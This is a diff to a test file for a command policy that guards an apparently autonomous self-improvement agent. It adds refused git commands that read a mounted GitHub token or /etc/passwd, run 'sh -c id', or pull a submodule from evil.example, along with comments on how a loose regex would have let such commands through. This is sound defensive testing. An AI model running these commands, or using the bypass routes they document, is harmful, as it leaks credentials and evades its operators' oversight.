@@ -213,6 +213,48 @@ REFUSED = [
     (["git", "fetch", "--receive-pack=sh -c id", "origin"], "selfimprove.no-git-exec-flags"),
     (["git", "rebase", "--exec", "sh -c id", "main"], "selfimprove.no-git-exec-flags"),
     (["git", "ls-remote", "ext::sh -c id"], "selfimprove.no-git-exec-flags"),
+    # The rules above are a denylist, and until `unlisted-git-subcommand` there
+    # was no allow-list on the git side to bound it -- so every one of git's
+    # ~150 subcommands that nobody had thought to name ran. These four take a
+    # path or an object and print the contents back, out of the one container
+    # that mounts the PAT and through a `/v1/exec` that does not redact stdout.
+    (["git", "hash-object", "-w", "/var/run/secrets/selfimprove-github/token"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "cat-file", "-p", "0123456789abcdef0123456789abcdef01234567"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "grep", "-h", "-f", "/var/run/secrets/selfimprove-github/token", "--", "."], "selfimprove.unlisted-git-subcommand"),
+    (["git", "archive", "-o", "/tmp/x.tar", "HEAD"], "selfimprove.unlisted-git-subcommand"),
+    # ...and the global flags do not carry one past the allow-list, in either
+    # the separated or the attached spelling.
+    (["git", "-C", "/src", "hash-object", "-w", "/etc/passwd"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "-Cx", "cat-file", "-p", "HEAD:x"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "--git-dir", "/src/.git", "grep", "x"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "--git-dir=/src/.git", "grep", "x"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "--no-pager", "cat-file", "-p", "HEAD"], "selfimprove.unlisted-git-subcommand"),
+    # Subcommands that run a program, write outside the tree, or reach a
+    # repository the loop does not own. None had a rule of its own.
+    (["git", "apply", "/tmp/p.patch"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "am", "/tmp/p.patch"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "bundle", "create", "/tmp/x.bundle", "HEAD"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "format-patch", "-o", "/tmp", "HEAD~1"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "submodule", "add", "https://evil.example/r"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "worktree", "add", "/tmp/w"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "filter-branch", "--tree-filter", "sh -c id"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "difftool", "-x", "sh -c id"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "daemon", "--export-all"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "fast-export", "--all"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "send-email", "--to", "x@y"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "update-index", "--chmod=+x", "x"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "bisect", "run", "sh"], "selfimprove.unlisted-git-subcommand"),
+    # A word boundary is not the end of a subcommand name: `\b` sits between
+    # `show` and the `-` of `show-ref`, so terminating the allow-list with one
+    # would have admitted every hyphenated plumbing command whose first half is
+    # a permitted porcelain one -- `checkout-index` writes files anywhere
+    # `--prefix` points, and `commit-tree` builds a commit nothing reviewed.
+    (["git", "show-ref"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "checkout-index", "--prefix=/tmp/x/", "-a"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "diff-tree", "-r", "HEAD"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "commit-tree", "-m", "x", "HEAD^{tree}"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "rev-list", "--all"], "selfimprove.unlisted-git-subcommand"),
+    (["git", "add--interactive"], "selfimprove.unlisted-git-subcommand"),
 ]
 
 # `shlex.join` writes an argument containing an apostrophe as a mixture of both
@@ -325,6 +367,27 @@ PERMITTED = [
     ["git", "switch", "-c", "selfimprove/forge-remote-set-url"],
     ["git", "switch", "-c", "selfimprove/fix-v1.2-push"],
     ["git", "-C", "/home/selfimprove/src/kube-agents.git/x", "status"],
+    # The other side of `unlisted-git-subcommand`: the reads and writes the loop
+    # is built out of, including the global-flag spellings the flag-skip has to
+    # walk past to find the subcommand at all.
+    ["git", "add", "-A"],
+    ["git", "add", "agents/selfimprove/scripts/selfimprove_run.py"],
+    ["git", "status", "--porcelain"],
+    ["git", "show", "--stat", "HEAD"],
+    ["git", "rev-parse", "HEAD"],
+    ["git", "branch", "--show-current"],
+    ["git", "ls-files"],
+    ["git", "blame", "-L", "1,20", "x.py"],
+    ["git", "merge-base", "HEAD", "origin/main"],
+    ["git", "describe", "--tags"],
+    ["git", "restore", "--staged", "x"],
+    ["git", "remote", "get-url", "origin"],
+    ["git", "--no-pager", "log", "--oneline"],
+    ["git", "--no-pager", "-C", "/src", "diff"],
+    ["git", "version"],
+    ["git", "help"],
+    ["git", "--version"],
+    ["git", "--help"],
 ]
 
 
